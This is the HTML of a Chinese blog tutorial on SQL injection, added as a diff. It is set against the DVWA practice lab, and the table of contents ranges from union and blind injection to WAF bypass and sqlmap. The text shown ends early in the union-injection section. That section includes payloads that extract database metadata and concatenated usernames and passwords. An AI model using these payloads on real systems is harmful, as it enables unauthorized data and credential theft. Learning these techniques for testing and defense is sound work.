@@ -1,0 +1,2567 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="学无止境">
+<title>SQL注入：从入门到入土</title>
+
+<link rel='canonical' href='https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/'>
+
+<link rel="stylesheet" href="/scss/style.min.e3073096d25e5a3d746191d039ec1146fd3a3920d63ab62f3cacf37f04c37a53.css"><meta property='og:title' content="SQL注入：从入门到入土">
+<meta property='og:description' content="学无止境">
+<meta property='og:url' content='https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/'>
+<meta property='og:site_name' content='kakahuote'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SQL' /><meta property='article:published_time' content='2025-07-02T00:52:02&#43;08:00'/><meta property='article:modified_time' content='2025-07-02T01:28:30&#43;08:00'/>
+<meta name="twitter:title" content="SQL注入：从入门到入土">
+<meta name="twitter:description" content="学无止境">
+    <link rel="shortcut icon" href="/favicon.ico" />
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>加载动画</title>
+    <style>
+        .loading {
+            position: fixed;
+            display: flex;
+            flex-direction: column;  
+            justify-content: center;
+            align-items: center;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 99;
+            background-color: #f5f5fa;
+            transition: transform 1.5s, opacity 1.5s;
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        .loader-bars {
+            display: flex;  
+            align-items: flex-end;  
+            gap: 3px;  
+            margin-bottom: 20px;  
+        }
+
+        .bar {
+            height: 5px;
+            width: 12px;
+            animation-duration: 0.45s;
+            animation-name: changeHeight;
+            animation-iteration-count: infinite;
+            animation-direction: alternate;
+        }
+
+        .red {
+            background-color: #E50000;
+            box-shadow: 1px 1px 10px #E50000;
+            animation-delay: 0.10s;
+        }
+
+        .orange {
+            background-color: #FF8D00;
+            box-shadow: 1px 1px 10px #FF8D00;
+            animation-delay: 0.20s;
+        }
+
+        .yellow {
+            background-color: #FFEE00;
+            box-shadow: 1px 1px 10px #FFEE00;
+            animation-delay: 0.25s;
+        }
+
+        .green {
+            background-color: #008121;
+            box-shadow: 1px 1px 10px #008121;
+            animation-delay: 0.30s;
+        }
+
+        .blue {
+            background-color: #004CFF;
+            box-shadow: 1px 1px 10px #004CFF;
+            animation-delay: 0.35s;
+        }
+
+        .violet {
+            background-color: #760188;
+            box-shadow: 1px 1px 10px #760188;
+            animation-delay: 0.40s;
+        }
+
+        @keyframes changeHeight {
+            from {
+                height: 5px;
+            }
+
+            to {
+                height: 40px;
+            }
+        }
+
+        .scaleAndFadeout {
+            transform: scale(1.5);
+            opacity: 0;
+        }
+
+         
+        .loading-text {
+            color: #333;  
+            font-size: 16px;  
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loading">
+        <div class="loader-bars">
+            <div class="red bar"></div>
+            <div class="orange bar"></div>
+            <div class="yellow bar"></div>
+            <div class="green bar"></div>
+            <div class="blue bar"></div>
+            <div class="violet bar"></div>
+        </div>
+        <div class="loading-text">loading...</div>
+    </div>
+
+    <script>
+        function initLoading() {
+            let loading = document.querySelector(".loading");
+            document.addEventListener('DOMContentLoaded', function() {
+                setTimeout(() => {
+                    loading.classList.add("scaleAndFadeout");
+                    setTimeout(() => {
+                        loading.style.display = "none";
+                    }, 1500);
+                }, 50);
+            });
+        }
+
+        initLoading();
+    </script>
+
+</body>
+</html>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img class="site-logo original-logo" src="/img/avatar_hu_4804467f7cda2058.png" width="300" height="300" loading="lazy" alt="原始头像">
+                    
+                    
+                        
+                        <img class="site-logo hover-logo" src="/img/avatar-hover_hu_f231304c77e946da.png" width="300" height="300" loading="lazy" alt="悬停头像">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🤝</span>
+                
+            </figure>
+            
+        
+
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">kakahuote</a></h1>
+            <h2 class="site-description">靡不有初，鲜克有终</h2>
+        </div>
+    </header>
+
+    <ol class="menu-social">
+                <li>
+                    <a
+                        href='https://bilibili.com'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a
+                        href='https://github.com'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            </ol>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#手工注入">手工注入</a>
+      <ol>
+        <li><a href="#0-环境配置">#0 环境配置</a></li>
+        <li><a href="#1-union联合查询注入">#1 union联合查询注入</a>
+          <ol>
+            <li><a href="#常用函数">常用函数</a></li>
+            <li><a href="#1判断注入是字符类型or数字型">1.判断注入是字符类型or数字型</a></li>
+            <li><a href="#2猜测sql查询语句中的字段数列数">2.猜测SQL查询语句中的字段数（列数）</a></li>
+            <li><a href="#3确定显示的字段顺序">3.确定显示的字段顺序</a></li>
+            <li><a href="#4获取当前数据库">4.获取当前数据库</a></li>
+            <li><a href="#5获取数据库中的表">5.获取数据库中的表</a></li>
+            <li><a href="#6获取表中的字段名">6.获取表中的字段名</a></li>
+            <li><a href="#7获取字段信息">7.获取字段信息</a></li>
+            <li><a href="#8逐行获取信息">8.逐行获取信息</a></li>
+          </ol>
+        </li>
+        <li><a href="#2-报错注入">#2 报错注入</a>
+          <ol>
+            <li><a href="#常用函数-1">常用函数</a>
+              <ol>
+                <li><a href="#extractvalue-xml_document-xpath_string">extractvalue (XML_document, XPath_string)</a></li>
+                <li><a href="#updatexml-xml_document-xpath_string-new_value">updatexml (XML_document, XPath_string, new_value)</a></li>
+              </ol>
+            </li>
+            <li><a href="#不那么常用的函数">不那么常用的函数</a>
+              <ol>
+                <li><a href="#floor函数8xmysql50">floor函数(8.x&gt;mysql&gt;5.0）</a></li>
+                <li><a href="#st_latfromgeohashgeohash_string">ST_LatFromGeoHash(geohash_string)</a></li>
+                <li><a href="#st_longfromgeohashgeohash_string">ST_LongFromGeoHash(geohash_string)</a></li>
+                <li><a href="#st_pointfromgeohashgeohash_string-srid">ST_PointFromGeoHash(geohash_string, srid)</a></li>
+                <li><a href="#gtid_subsetsubset-set">GTID_SUBSET(subset, set)</a></li>
+              </ol>
+            </li>
+            <li><a href="#爆破数据库名称">爆破数据库名称</a></li>
+            <li><a href="#爆破表名">爆破表名</a></li>
+            <li><a href="#爆破列名">爆破列名</a></li>
+            <li><a href="#爆破字段内容">爆破字段内容</a></li>
+          </ol>
+        </li>
+        <li><a href="#3-盲注">#3 盲注</a>
+          <ol>
+            <li><a href="#常用函数-2">常用函数</a></li>
+            <li><a href="#布尔盲注">布尔盲注</a>
+              <ol>
+                <li><a href="#猜测长度">猜测长度</a></li>
+                <li><a href="#猜测库名">猜测库名</a></li>
+                <li><a href="#猜测表的数量">猜测表的数量</a></li>
+                <li><a href="#猜测表2的长度">猜测表2的长度</a></li>
+              </ol>
+            </li>
+            <li><a href="#时间盲注">时间盲注</a>
+              <ol>
+                <li><a href="#sleep延时">sleep延时</a></li>
+                <li><a href="#benchmark延时">benchmark延时</a></li>
+                <li><a href="#笛卡尔积延时">笛卡尔积延时</a></li>
+                <li><a href="#正则匹配延时">正则匹配延时</a></li>
+              </ol>
+            </li>
+            <li><a href="#报错盲注">报错盲注</a>
+              <ol>
+                <li><a href="#exp">exp()</a></li>
+                <li><a href="#cot">cot()</a></li>
+                <li><a href="#pow">pow()</a></li>
+              </ol>
+            </li>
+          </ol>
+        </li>
+        <li><a href="#4-堆叠注入">#4 堆叠注入</a></li>
+        <li><a href="#5-dnslog注入">#5 DNSlog注入</a>
+          <ol>
+            <li><a href="#准备dnslog平台">准备DNSlog平台</a></li>
+            <li><a href="#构造注入payload">构造注入Payload</a></li>
+          </ol>
+        </li>
+        <li><a href="#6-http请求注入">#6 http请求注入</a>
+          <ol>
+            <li><a href="#getpost请求注入">GET/POST请求注入</a></li>
+            <li><a href="#http头部参数注入">http头部参数注入</a></li>
+            <li><a href="#cookie注入">cookie注入</a></li>
+          </ol>
+        </li>
+        <li><a href="#7-二次注入">#7 二次注入</a></li>
+      </ol>
+    </li>
+    <li><a href="#绕过waf">绕过WAF</a>
+      <ol>
+        <li><a href="#1-空格过滤绕过">#1 空格过滤绕过</a>
+          <ol>
+            <li><a href="#注释绕过">注释绕过</a></li>
+            <li><a href="#url编码绕过">url编码绕过</a></li>
+            <li><a href="#括号绕过">括号绕过</a>
+              <ol>
+                <li><a href="#数字型">数字型</a></li>
+                <li><a href="#字符型数字型">字符型&amp;数字型</a></li>
+              </ol>
+            </li>
+          </ol>
+        </li>
+        <li><a href="#2-内联注释绕过">#2 内联注释绕过</a>
+          <ol>
+            <li><a href="#绕过特定屏蔽词">绕过特定屏蔽词</a></li>
+            <li><a href="#干扰waf过滤">干扰WAF过滤</a></li>
+          </ol>
+        </li>
+        <li><a href="#3-大小写绕过">#3 大小写绕过</a></li>
+        <li><a href="#4-双写绕过">#4 双写绕过</a></li>
+        <li><a href="#5-编码绕过">#5 编码绕过</a>
+          <ol>
+            <li><a href="#双重url编码绕过">双重URL编码绕过</a></li>
+            <li><a href="#十六进制unicode编码ascii编码绕过">十六进制、Unicode编码、ASCII编码绕过</a></li>
+          </ol>
+        </li>
+        <li><a href="#6-等价代替绕过">#6 等价代替绕过</a>
+          <ol>
+            <li><a href="#逻辑符号过滤">逻辑符号过滤</a>
+              <ol>
+                <li><a href="#等号过滤绕过">等号(=)过滤绕过</a></li>
+                <li><a href="#大于号和小于号过滤绕过">大于号(&gt;)和小于号(&lt;)过滤绕过</a></li>
+                <li><a href="#and和or过滤绕过">and和or过滤绕过</a></li>
+              </ol>
+            </li>
+            <li><a href="#注释符号过滤">注释符号过滤</a></li>
+            <li><a href="#逗号过滤">逗号过滤</a>
+              <ol>
+                <li><a href="#绕过limit中的逗号">绕过limit中的逗号</a></li>
+                <li><a href="#绕过函数参数中的逗号">绕过函数参数中的逗号</a></li>
+                <li><a href="#绕过select列表中的逗号">绕过select列表中的逗号</a></li>
+              </ol>
+            </li>
+            <li><a href="#函数过滤">函数过滤</a>
+              <ol>
+                <li><a href="#常见函数过滤">常见函数过滤</a></li>
+                <li><a href="#case-when语句代替if">case when语句代替if</a></li>
+                <li><a href="#reverseleft代替substring">reverse+left代替substring</a></li>
+                <li><a href="#trim代替substring">trim代替substring</a></li>
+              </ol>
+            </li>
+          </ol>
+        </li>
+        <li><a href="#7-宽字节绕过">#7 宽字节绕过</a>
+          <ol>
+            <li><a href="#注入原理">注入原理</a></li>
+            <li><a href="#注入过程">注入过程</a></li>
+          </ol>
+        </li>
+        <li><a href="#8-正则表达式绕过">#8 正则表达式绕过</a></li>
+        <li><a href="#9-多参数请求拼凑">#9 多参数请求拼凑</a></li>
+      </ol>
+    </li>
+    <li><a href="#sqlmap使用">SqlMap使用</a>
+      <ol>
+        <li><a href="#基本使用步骤">基本使用步骤</a>
+          <ol>
+            <li><a href="#检查注入点">检查注入点</a></li>
+            <li><a href="#爆破数据库信息">爆破数据库信息</a></li>
+            <li><a href="#爆破指定数据库的所有表名">爆破指定数据库的所有表名</a></li>
+            <li><a href="#爆破指定表的所有列名">爆破指定表的所有列名</a>
+              <ol>
+                <li><a href="#updatexml-xml_document-xpath_string-new_value-1">updatexml (XML_document, XPath_string, new_value)</a></li>
+              </ol>
+            </li>
+            <li><a href="#打印指定列名的字段数据">打印指定列名的字段数据</a></li>
+            <li><a href="#查看用户权限">查看用户权限</a></li>
+            <li><a href="#查看数据库密码">查看数据库密码</a></li>
+          </ol>
+        </li>
+        <li><a href="#结合burpsuite使用">结合burpsuite使用</a>
+          <ol>
+            <li><a href="#拦截请求">拦截请求</a></li>
+            <li><a href="#进行爆破">进行爆破</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/" >
+                技术学习
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+
+
+        <h2 class="article-title">
+            <a href="/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/">SQL注入：从入门到入土</a>
+        </h2>
+        
+        <h3 class="article-subtitle">
+            学无止境
+        </h3>
+        
+
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">
+                    发布时间：2025-07-02</time>
+            </div>
+        
+
+        
+
+        <div class="article-lastmod">
+               <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+               <time>
+                   更新时间：2025-07-02
+               </time>
+           </div>
+        <div>
+            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
+            <time class="article-time--published">
+                浏览量：<span class="waline-pageview-count" data-waline-pageview-count="0">0</span>
+            </time>
+        </div>
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而得到相应的数据信息</p>
+<p>我们可以选择<strong>手工注入</strong>，也能够选择使用自动化工具<strong>sqlmap</strong>进行注入</p>
+<h1 id="手工注入">手工注入
+</h1><h2 id="0-环境配置">#0 环境配置
+</h2><p><strong>使用靶机：DVWA mysql</strong></p>
+<p>将DVWA的security级别设置为low，可以看到php源码中是一句简单的查询语句，没有进行任何过过滤</p>
+<p><strong>当用户输入查询内容的时候，$id将会被替换成此内容：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$query</span>  <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span style="color:#98c379">$id</span><span style="color:#98c379">&#39;;
+</span></span></span></code></pre></div><p>比如，我们输入1，那么执行的语句就是</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#e06c75">first_name</span>, <span style="color:#e06c75">last_name</span> <span style="color:#c678dd">FROM</span> <span style="color:#e06c75">users</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">user_id</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;1&#39;</span>
+</span></span></code></pre></div><p>那如果我们输入1&rsquo; and 1=1#:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#e06c75">first_name</span>, <span style="color:#e06c75">last_name</span> <span style="color:#c678dd">FROM</span> <span style="color:#e06c75">users</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">user_id</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;1&#39;</span> <span style="color:#c678dd">and</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">#</span> <span style="color:#98c379">&#39;
+</span></span></span></code></pre></div><p><strong>可以看到，前面的&rsquo;&lsquo;闭合了，后面的&rsquo;被我们注释了，中间的and1=1会被正常执行</strong></p>
+<p>那么我们完全可以在这里面插入自己想要执行的sql语句，这就是SQL注入！</p>
+<h2 id="1-union联合查询注入">#1 union联合查询注入
+</h2><p>虽然知道可以执行任意sql代码了，但是我们又不知道有哪些表，表里面有哪些元素，有什么用呢？</p>
+<p>所以，现在我们需要通过一系列的操作，来确定这些东西：</p>
+<p><strong>1.判断是否存在注入，注入是字符型还是数字型</strong></p>
+<p><strong>2.猜测SQL查询语句中的字段数</strong></p>
+<p><strong>3.确定显示的字段顺序</strong></p>
+<p><strong>4.获取当前数据库</strong></p>
+<p><strong>5.获取数据库中的表</strong></p>
+<p><strong>6.获取表中的字段名</strong></p>
+<p><strong>7.显示字段信息</strong></p>
+<p>那么，开始吧！</p>
+<h3 id="常用函数">常用函数
+</h3><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>功能类别</th>
+          <th>函数/语句</th>
+          <th>主要数据库</th>
+          <th>功能描述</th>
+          <th>注入示例</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>系统信息查询</strong></td>
+          <td><code>database()</code> 或 <code>schema()</code></td>
+          <td>MySQL</td>
+          <td>获取当前数据库的名称</td>
+          <td><code>' union select 1,database() #</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td><code>version()</code> 或<code>@@version</code></td>
+          <td>通用</td>
+          <td>获取数据库的详细版本号</td>
+          <td><code>' union select 1,version() #</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td><code>user()</code> 或 <code>current_user()</code></td>
+          <td>通用</td>
+          <td>获取执行查询的数据库用户名</td>
+          <td><code>' union select 1,user() #</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td><code>@@hostname</code></td>
+          <td>MySQL, MSSQL</td>
+          <td>获取数据库服务器的主机名</td>
+          <td><code>' union select 1,@@hostname #</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td><code>@@datadir</code></td>
+          <td>MySQL</td>
+          <td>获取数据库文件的存储路径</td>
+          <td><code>' union select 1,@@datadir #</code></td>
+      </tr>
+      <tr>
+          <td><strong>数据查询与拼接</strong></td>
+          <td><code>group_concat()</code></td>
+          <td>MySQL, SQLite</td>
+          <td><strong>将多行结果合并成一个字符串一行显示</strong>，用于一次性列出所有表名/列名</td>
+          <td><code>' union select 1,group_concat(table_name) from information_schema.tables #</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td><code>concat()</code> 或 <code>concat_ws()</code></td>
+          <td>MySQL</td>
+          <td>将多个字符串或列连接成一个，<strong>但是不改变行数</strong>，用于拼接用户名和密码等字段</td>
+          <td><code>' union select 1,concat(username,':',password) from users #</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td><code>count()</code></td>
+          <td>通用</td>
+          <td>统计行数</td>
+          <td><code>' union select 1,count(*) from users #</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td><code>substring()</code> 或 <code>limit</code></td>
+          <td>通用</td>
+          <td>截取字符串或按行返回。主要用于盲注，逐个字符或逐行猜解数据</td>
+          <td><code>' and substring(database(),1,1)='a' #</code></td>
+      </tr>
+  </tbody>
+</table></div>
+<h3 id="1判断注入是字符类型or数字型">1.判断注入是字符类型or数字型
+</h3><p><strong><mark>为什么需要判断？因为数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合</mark></strong></p>
+<p>**数字型：**select * from table where id =$id，我们可以直接输入<code>1 and ...</code> 进行执行:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">from</span> <span style="color:#c678dd">table</span> <span style="color:#c678dd">where</span> <span style="color:#e06c75">id</span> <span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span> <span style="color:#c678dd">and</span> ...
+</span></span></code></pre></div><p>**字符型：**select * from table where id=&rsquo;$id&rsquo;我们需要输入<code>1' and ... #</code>  ，闭合前后单引号</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">from</span> <span style="color:#c678dd">table</span> <span style="color:#c678dd">where</span> <span style="color:#e06c75">id</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;1&#39;</span> <span style="color:#c678dd">and</span> ... <span style="color:#56b6c2">#</span><span style="color:#98c379">&#39;       
+</span></span></span></code></pre></div><blockquote>
+<p><mark><strong>关于注释：</strong></mark></p>
+<p><strong>&ndash; 是官方的注释，后面必须跟空格</strong></p>
+<p><strong># 是mysql特有的注释，后面无需跟空格</strong></p>
+<p><strong>有的网站会过滤空格导致&ndash;报错，这时候可以使用&ndash;+，用+代替空格</strong></p>
+<p><strong>以上方法不一定全部适用，需要结合实际情况尝试</strong></p></blockquote>
+<p><strong>基于这种思路，只要我们能够测试注入成功，使得页面不出现语法报错，那么就可以借此判断出类型：</strong></p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th style="text-align: left">测试目的</th>
+          <th style="text-align: left">测试Payload</th>
+          <th style="text-align: left">预期结果</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
